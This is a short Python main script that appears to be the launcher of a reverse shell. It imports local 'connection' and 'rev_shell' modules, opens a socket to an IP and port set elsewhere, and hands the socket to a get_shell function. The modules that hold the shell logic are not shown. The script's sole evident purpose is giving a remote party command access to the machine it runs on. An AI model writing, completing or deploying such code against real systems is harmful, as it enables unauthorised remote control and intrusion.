import connection as conn
import rev_shell as shell

def main():
    sock = conn.connect(conn.IP, conn.PORT)
    shell.get_shell(sock)
    


if __name__ == "__main__":
    main()